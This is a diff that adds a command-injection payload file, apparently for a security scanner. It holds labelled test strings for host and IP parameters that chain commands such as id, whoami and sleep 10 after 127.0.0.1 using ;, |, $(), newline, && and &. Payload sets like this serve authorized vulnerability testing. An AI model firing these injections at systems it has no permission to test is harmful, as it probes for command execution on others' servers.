@@ -1,0 +1,36 @@
+# @default_os:     linux
+# @default_signal: system:linux_id
+# @default_blind:  false
+# @default_tier:   2
+#
+# Payloads for host/ip/target/ping parameters.
+# These are highest-probability CMDi sinks in network-facing apps.
+
+# @label: Inline id after IP
+127.0.0.1;id
+
+# @label: Inline whoami after IP
+# @signal: system:linux_user
+127.0.0.1;whoami
+
+# @label: Pipe id after IP
+127.0.0.1|id
+
+# @label: Subshell after IP
+127.0.0.1$(id)
+
+# @label: Newline id after IP
+127.0.0.1%0aid
+
+# @label: AND id after IP
+127.0.0.1&&id
+
+# @label: Sleep after IP
+# @signal: time
+# @blind: true
+127.0.0.1;sleep 10
+
+# @label: Win ping chain whoami
+# @os: windows
+# @signal: system:win_user
+127.0.0.1&whoami
